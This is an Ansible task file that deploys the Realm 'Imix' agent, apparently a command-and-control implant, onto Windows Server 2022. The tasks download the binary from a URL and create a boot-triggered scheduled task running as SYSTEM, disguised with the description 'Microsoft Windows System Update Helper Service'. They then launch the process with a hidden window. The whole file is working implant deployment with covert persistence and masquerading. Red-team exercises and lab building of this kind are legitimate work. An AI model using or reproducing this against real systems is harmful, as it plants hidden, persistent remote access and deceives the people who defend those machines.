---
# Deploys the Realm (Imix) agent on Windows Server 2022

- name: "[Realm/Windows] Download Imix binary"
  win_get_url:
    url:  "{{ realm_windows_binary_url }}"
    dest: "{{ realm_windows_bin_path }}"
    force: true

- name: "[Realm/Windows] Create Scheduled Task for persistence"
  win_scheduled_task:
    name:        "{{ realm_windows_task_name }}"
    description: "Microsoft Windows System Update Helper Service"
    actions:
      - path: "{{ realm_windows_bin_path }}"
    triggers:
      - type: boot
    run_level:   highest
    logon_type:  service_account
    username:    SYSTEM
    state:       present
    enabled:     true

- name: "[Realm/Windows] Start agent process if not running"
  win_shell: |
    if (-not (Get-Process -Name "{{ realm_windows_process_name }}" -ErrorAction SilentlyContinue)) {
        Start-Process -FilePath "{{ realm_windows_bin_path }}" -WindowStyle Hidden
    }

- name: "[Realm/Windows] Verify process is running"
  win_shell: |
    (Get-Process -Name "{{ realm_windows_process_name }}" -ErrorAction SilentlyContinue) -ne $null
  register: realm_proc_state
  changed_when: false

- name: "[Realm/Windows] Print process state"
  debug:
    msg: "Realm process running on {{ inventory_hostname }}: {{ realm_proc_state.stdout | trim }}"
